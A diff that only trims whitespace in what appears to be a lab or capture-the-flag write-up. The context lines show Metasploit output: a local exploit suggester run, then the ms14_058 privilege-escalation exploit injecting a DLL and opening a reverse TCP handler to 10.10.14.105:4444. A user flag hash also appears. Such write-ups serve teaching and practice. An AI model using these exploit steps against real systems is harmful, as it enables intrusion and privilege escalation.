@@ -3,7 +3,7 @@ Hosts
 
 address     mac  name  os_name       os_flavor  os_sp  purpose  info  comments
 -------     ---  ----  -------       ---------  -----  -------  ----  --------
-10.10.10.5             Windows 2008                    server         
+10.10.10.5             Windows 2008                    server
 
 Services
 ========
@@ -51,7 +51,7 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 
 msf exploit(ms14_058_track_popup_menu) > run
 
-[*] Started reverse TCP handler on 10.10.14.105:4444 
+[*] Started reverse TCP handler on 10.10.14.105:4444
 [*] Launching notepad to host the exploit...
 [+] Process 1824 launched.
 [*] Reflectively injecting the exploit DLL into 1824...
@@ -76,6 +76,3 @@ user: 9ecdd6a3aedf24b41562fea70f4cb3e8
 https://community.rapid7.com/community/metasploit/blog/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more
 
 https://netsec.ws/?p=331
-
-
-
